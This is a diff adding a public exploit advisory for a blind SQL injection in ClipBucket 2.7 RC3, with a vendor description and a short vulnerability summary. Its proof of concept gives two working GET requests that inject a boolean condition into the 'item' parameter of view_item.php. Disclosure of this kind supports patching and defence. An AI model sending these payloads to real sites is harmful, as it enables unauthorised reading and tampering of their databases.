@@ -1,0 +1,49 @@
+# Exploit Title   : Clipbucket 2.7 RC3 0.9 Blind SQL Injection
+# Date            : 20 February 2015
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://clip-bucket.com/
+# Software Link   : http://sourceforge.net/projects/clipbucket/files/ClipBucket%20v2/clipbucket-2.7.0.4.v2929-rc3.zip
+# Version         : 2.7.0.4.v2929-rc3
+# Tested on       : Window and Linux
+   
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /       
+  / XXXXXX /
+ (________(         
+  `------'
+  
+####################
+SOFTWARE DESCRIPTION
+####################
+  
+ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all
+the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any
+other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was
+first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable &
+scalable media distribution platform with latest social networking features, while staying light on your pockets.
+Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video
+management needs.
+  
+##################################
+VULNERABILITY: Blind SQL Injection
+##################################
+   
+An attacker might execute arbitrary SQL commands on the database server with this vulnerability.
+User tainted data is used when creating the database query that will be executed on the database management system (DBMS).
+An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system
+depending on the query, DBMS and configuration.
+  
+= POC =
+GET /clipbucket/view_item.php?item=a%27%20or%20%27a%27=%27a&type=photos&collection=9	=> True Condition
+GET /clipbucket/view_item.php?item=a%27%20or%20%27a%27=%27b&type=photos&collection=9	=> False Condition (Item does not exist.)
+   
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+################################################################################################################
